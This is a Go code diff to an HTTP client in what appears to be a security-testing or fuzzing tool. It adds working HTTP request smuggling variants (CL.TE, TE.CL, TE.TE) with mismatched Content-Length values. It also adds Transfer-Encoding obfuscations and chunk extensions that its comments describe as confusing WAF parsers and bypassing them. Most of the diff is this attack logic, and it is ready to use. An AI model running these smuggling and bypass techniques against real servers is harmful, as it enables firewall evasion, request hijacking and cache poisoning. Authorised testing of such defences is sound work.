@@ -16,8 +16,9 @@ import (
 
 // ChunkedClient handles chunked transfer encoding tricks
 type ChunkedClient struct {
-	config  ChunkedOptions
-	timeout time.Duration
+	config             ChunkedOptions
+	timeout            time.Duration
+	InsecureSkipVerify bool
 }
 
 // NewChunkedClient creates a new chunked client
@@ -41,10 +42,7 @@ func (c *ChunkedClient) SendChunkedRequest(ctx context.Context, req *types.HTTPR
 	// Establish connection
 	conn, err := c.dial(host, useTLS)
 	if err != nil {
-		return &types.HTTPResponse{
-			Error:   err.Error(),
-			Latency: time.Since(start),
-		}, nil
+		return nil, fmt.Errorf("failed to connect to %s: %w", host, err)
 	}
 	defer conn.Close()
 
@@ -79,7 +77,7 @@ func (c *ChunkedClient) SendChunkedRequest(ctx context.Context, req *types.HTTPR
 func (c *ChunkedClient) dial(host string, useTLS bool) (net.Conn, error) {
 	if useTLS {
 		return tls.Dial("tcp", host, &tls.Config{
-			InsecureSkipVerify: true,
+			InsecureSkipVerify: c.InsecureSkipVerify,
 		})
 	}
 	return net.Dial("tcp", host)
@@ -96,7 +94,36 @@ func (c *ChunkedClient) writeChunkedRequest(conn net.Conn, req *types.HTTPReques
 
 	// Write headers
 	fmt.Fprintf(conn, "Host: %s\r\n", strings.Split(host, ":")[0])
-	fmt.Fprintf(conn, "Transfer-Encoding: chunked\r\n")
+
+	// Determine Transfer-Encoding header value
+	teValue := "chunked"
+	if opts.TEObfuscation != "" {
+		teValue = opts.TEObfuscation
+	}
+
+	// Handle smuggling variants and dual headers
+	if opts.DualHeaders && opts.SmugglingVariant == "cl_te" {
+		// CL.TE: Content-Length first (front-end trusts CL), then TE
+		// Use a small CL to make front-end think body is short
+		smallCL := 4 // Minimal content length for smuggling
+		if len(req.Body) > 0 {
+			smallCL = len(req.Body) / 2 // Half the body — front-end stops reading early
+		}
+		fmt.Fprintf(conn, "Content-Length: %d\r\n", smallCL)
+	}
+
+	if opts.SmugglingVariant == "te_te" {
+		// TE.TE: write two Transfer-Encoding headers
+		fmt.Fprintf(conn, "Transfer-Encoding: chunked\r\n")
+		fmt.Fprintf(conn, "Transfer-Encoding: x\r\n")
+	} else {
+		fmt.Fprintf(conn, "Transfer-Encoding: %s\r\n", teValue)
+	}
+
+	if opts.DualHeaders && opts.SmugglingVariant != "cl_te" {
+		// TE.CL: Content-Length after TE (back-end trusts CL)
+		fmt.Fprintf(conn, "Content-Length: %d\r\n", len(req.Body))
+	}
 
 	for k, v := range req.Headers {
 		fmt.Fprintf(conn, "%s: %s\r\n", k, v)
@@ -144,7 +171,9 @@ func (c *ChunkedClient) writeChunkedBody(conn net.Conn, body []byte, opts Chunke
 		// Write chunk size
 		if opts.InvalidChunkSize {
 			// Write malformed chunk size (may confuse some parsers)
-			fmt.Fprintf(conn, " %x\r\n", size)
+			fmt.Fprintf(conn, " %x%s\r\n", size, opts.ChunkExtension)
+		} else if opts.ChunkExtension != "" {
+			fmt.Fprintf(conn, "%x%s\r\n", size, opts.ChunkExtension)
 		} else {
 			fmt.Fprintf(conn, "%x\r\n", size)
 		}
@@ -190,7 +219,10 @@ func (c *ChunkedClient) readResponse(conn net.Conn) (*types.HTTPResponse, error)
 		return nil, fmt.Errorf("invalid status line: %s", statusLine)
 	}
 
-	statusCode, _ := strconv.Atoi(parts[1])
+	statusCode, err := strconv.Atoi(parts[1])
+	if err != nil {
+		return nil, fmt.Errorf("invalid status code %q: %w", parts[1], err)
+	}
 	status := statusLine
 
 	// Read headers
@@ -256,6 +288,11 @@ func (c *ChunkedClient) readChunkedBody(reader *bufio.Reader) ([]byte, error) {
 		sizeLine, err := reader.ReadString('\n')
 		if err != nil {
 			return body, err
+		}
+		sizeLine = strings.TrimSpace(sizeLine)
+		// Strip chunk extensions (RFC 7230: chunk = chunk-size [ chunk-ext ] CRLF)
+		if idx := strings.IndexByte(sizeLine, ';'); idx >= 0 {
+			sizeLine = sizeLine[:idx]
 		}
 		sizeLine = strings.TrimSpace(sizeLine)
 
@@ -390,6 +427,56 @@ func (m *ChunkedMutator) GenerateMutations(body string) []ChunkedOptions {
 		Enabled:        true,
 		ChunkSizes:     []int{bodyLen},
 		TrailerHeaders: map[string]string{"X-Checksum": "0"},
+	})
+
+	// Bare semicolon chunk extension - confuses some WAF parsers
+	mutations = append(mutations, ChunkedOptions{
+		Enabled:        true,
+		ChunkExtension: ";",
+	})
+
+	// CL.TE smuggling variant
+	mutations = append(mutations, ChunkedOptions{
+		Enabled:          true,
+		DualHeaders:      true,
+		SmugglingVariant: "cl_te",
+	})
+
+	// TE.CL smuggling variant
+	mutations = append(mutations, ChunkedOptions{
+		Enabled:          true,
+		DualHeaders:      true,
+		SmugglingVariant: "te_cl",
+	})
+
+	// TE.TE with obfuscation
+	mutations = append(mutations, ChunkedOptions{
+		Enabled:          true,
+		SmugglingVariant: "te_te",
+	})
+
+	// TE with tab obfuscation
+	mutations = append(mutations, ChunkedOptions{
+		Enabled:       true,
+		TEObfuscation: "chunked\t",
+	})
+
+	// TE with space prefix
+	mutations = append(mutations, ChunkedOptions{
+		Enabled:       true,
+		TEObfuscation: " chunked",
+	})
+
+	// TE with mixed case
+	mutations = append(mutations, ChunkedOptions{
+		Enabled:       true,
+		TEObfuscation: "Chunked",
+	})
+
+	// Chunk extension with key=value
+	mutations = append(mutations, ChunkedOptions{
+		Enabled:        true,
+		ChunkExtension: ";ext=bypass",
 	})
 
 	return mutations
